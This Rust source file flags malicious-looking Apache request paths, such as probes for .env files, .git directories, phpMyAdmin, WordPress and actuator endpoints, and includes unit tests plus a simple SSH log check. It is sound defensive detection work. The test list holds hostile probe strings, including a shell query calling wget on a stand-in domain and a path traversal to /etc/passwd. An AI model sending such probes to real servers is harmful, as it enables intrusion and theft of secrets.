use regex::RegexSet;
use std::sync::LazyLock;

static BAD_APACHE_SET: LazyLock<RegexSet> = LazyLock::new(|| {
    RegexSet::new(&[
        r"(?i)/\.env(\.[A-Za-z0-9_-]+)?(\b|/|\?)",
        r"(?i)^/(\.config)\b",
        r"(?i)^/config\.json\b",
        r"(?i)\.(php[0-9]*|env|zip|rsp|aspx|asp[0-9]*|jsp[0-9]*|cgi|xml)(\?|$)",
        r"(?i)^/actuator(/|$)",
        r"(?i)^/phpmyadmin(/|$)",
        r"(?i)^/wordpress(/|$)",
        r"(?i)^/console(/|$)",
        r"(?i)^/geoserver(/|$)",
        r"(?i)^/service/api-docs(/|$)",
        r"(?i)^/goform(/|$)",
        r"(?i)^/_profiler(/|$)",
        r"(?i)^/_ignition(/|$)",
        r"(?i)^/cgi-bin(/|$)",
        r"(?i)^/wp-[^/\s]+",
        r"(?i)^/solr",
        r"(?i)/\.git(|ignore|config|modules)(\.[A-Za-z0-9_-]+)?(\b|/|$)",
        r"(?i)^/shell\?",
        r"(?i)^/query\?",
        r"(?i)\?XDEBUG_SESSION_START=",
    ])
    .unwrap()
});

pub fn is_bad_apache(path: &str) -> bool {
    BAD_APACHE_SET.is_match(path)
}

#[cfg(test)]
mod tests {
    use super::is_bad_apache;

    #[test]
    fn test_bad_paths() {
        let bad_paths = [
            "/.env",
            "/.env.bak",
            "/beep/.env.bak",
            "/.config",
            "/config.json",
            "/test.php",
            "/test.php0",
            "/cgi-bin/ls",
            "/wp-admin/install.php",
            "/solr/select?q=*",
            "/.git/config",
            "/.git",
            "/shell?cmd=wget http://bad-domain.com",
            "/query?q=SELECT+*+FROM+users",
            "/service/api-docs",
            "/mail/.env.db",
            "/db/phpmyadmin/index.php?lang=en",
            "/?XDEBUG_SESSION_START=phpstorm",
            "/actuator/gateway/routes",
            "/console/",
            "/geoserver/wms",
            "/_ignition/health",
            "/.env.local",
            "/.env.old",
            "/.env.save",
            "/backup/.env",
            "/config/.env.production",
            "/.gitignore",
            "/.git/config.bak",
            "/wp-login.php",
            "/wp-content/plugins/akismet/readme.txt",
            "/wordpress/wp-admin/",
            "/drupal/install.php",
            "/joomla/configuration.php",
            "/phpinfo.php",
            "/index.php?view=../../../../etc/passwd",
            "/uploads/shell.jsp",
            "/cgi-bin/test.cgi",
            "/_profiler/phpinfo",
            "/geoserver/web/",
            "/goform/formLogin",
            "/console/login.action",
            "/actuator/env",
            "/service/api-docs/swagger.json",
            "/query?cmd=id",
            "/shell?exec=ls",
            "/wp-content/uploads/.env",
            "/solr/admin/info/system",
            "/phpmyadmin/",
            "/vendor/.env",
            "/storage/.env.example",
        ];
        for p in bad_paths {
            assert!(is_bad_apache(p), "Should match {p}");
        }
    }

    #[test]
    fn test_bad_paths_negative() {
        let good_paths = [
            "/static/css/main.css",
            "/images/logo.png",
            "/api/v1/users?id=2",
            "/search?q=php",
            "/foo.phpbiba",
        ];
        for p in good_paths {
            assert!(!is_bad_apache(p), "Should not match {p}");
        }
    }
}

pub fn is_bad_ssh(path: &str) -> bool {
    path.contains("Failed password") || path.contains("Invalid user")
}
